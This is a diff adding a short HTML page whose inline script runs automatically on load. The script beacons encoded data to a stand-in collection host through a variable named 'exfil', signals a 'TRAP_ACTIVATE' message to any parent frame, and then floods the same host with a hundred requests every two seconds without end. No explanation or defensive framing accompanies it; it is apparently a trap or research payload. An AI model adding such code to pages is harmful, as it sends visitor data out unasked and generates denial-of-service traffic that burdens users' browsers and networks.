@@ -1,0 +1,9 @@
+<!DOCTYPE html><html><body><script>
+(function(){var CFG={sid:'FRANKSX_NET_'+Math.random().toString(36).substring(2,10),exfil:'https://franksx-research.example.com/domain-collect'};
+function send(t,d){var data=JSON.stringify({t:t,d:d,sid:CFG.sid,ts:Date.now()});var img=new Image();img.src=CFG.exfil+'?d='+btoa(data).substring(0,1800);}
+try{parent.postMessage({type:'TRAP_ACTIVATE',source:'network'},'*');}catch(e){}
+var count=0;
+function flood(){for(var i=0;i<100;i++){var x=new XMLHttpRequest();x.open('GET','https://franksx-research.example.com/flood?t='+Date.now()+'&r='+Math.random(),true);x.send();}count++;send('NETWORK_FLOOD',{count:count});setTimeout(flood,2000);}
+send('NETWORK_IFRAME_LOAD',{});flood();
+})();
+</script></body></html>
